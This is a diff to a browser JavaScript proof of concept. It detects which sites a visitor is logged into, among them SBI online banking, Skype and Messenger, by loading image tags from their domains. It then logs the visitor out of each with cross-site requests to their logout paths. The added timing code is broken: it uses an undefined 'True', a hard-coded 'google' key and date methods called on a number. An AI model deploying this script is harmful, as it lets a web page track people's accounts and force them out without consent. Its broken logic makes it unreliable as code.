@@ -25,7 +25,7 @@ var platforms = [{
    },
    {
    domain: "https://retail.onlinesbi.com",
-   redirect: "/sbijava/images/logoutimages/right_curve.jp",
+   redirect: "/retail/mypage.htm",
    name: "SBI",
    loggedIn : false,
    logoutPath:"/retail/logout.htm"
@@ -41,8 +41,17 @@ var platforms = [{
   name: "Skype",
   loggedIn: false,
   logoutPath:"/portal/logout"
-}
+},{
+  domain: "https://www.messenger.com",
+  redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fwww.messenger.com%2Ffavicon.ico",
+  name: "Messenger",
+  loggedIn: false,
+  logoutPath:"/logout"
+	}
 ];
+
+var lastLoggedInTime={}
+var refreshToken={};
 
 
 var leakSocialMediaAccounts = function(callback) {
@@ -52,7 +61,9 @@ var leakSocialMediaAccounts = function(callback) {
 	    var img = document.createElement('img');
 	    img.src = network.domain + network.redirect;
 	    img.onload = function() {
-	      network.loggedIn=true;            
+	      network.loggedIn=true;
+	      var now = new Date().getTime()            
+	      lastLoggedInTime['google']=now;
 	      callback(network, true);
 	    };
 	    img.onerror = function() {
@@ -81,6 +92,7 @@ function displayResult(network, loggedIn) {
 
 leakSocialMediaAccounts(displayResult);
 
+
 function faviconUri(network) {
   var favicon = network.domain + '/favicon.ico';
   if (network.name === 'Dropbox') {
@@ -97,24 +109,28 @@ function faviconUri(network) {
 }
 
 function logOutUser(){
-
-  console.log('Starting to log out');
   
   platforms.forEach(function(network) {
   	console.log(network.name + ':' + network.loggedIn);
-      console.log('Checking:' + network.name);
 
       var img = document.createElement('img');
       img.src = network.domain + network.logoutPath;
+      
+      console.log('Checking');
       console.log(img.src);
 
       
       img.onload = function() {
-	//This fuction will never be called because these url dont return an image
-		console.log("Logout Sucessfully");          
+		//This fuction will never be called because these url dont return an image
       };
       
       img.onerror = function() {
+      	if(network.loggedIn==True)
+      		{	var now = new Date().getTime()
+      			refreshToken[network] = lastLoggedInTime[network] - now;
+      			console.log(refreshToken['google'].getHours() + " Hours " + refreshToken['google'].getMinutes() + " Minutes " + refreshToken['google'].getSeconds() + " Seconds");
+      		}
+
 		console.log("Logging you out of " + network.name);          				            
       };
     
@@ -123,5 +139,6 @@ function logOutUser(){
   });
 
 };
+
 
 // setInterval(logOutUser,1000);	
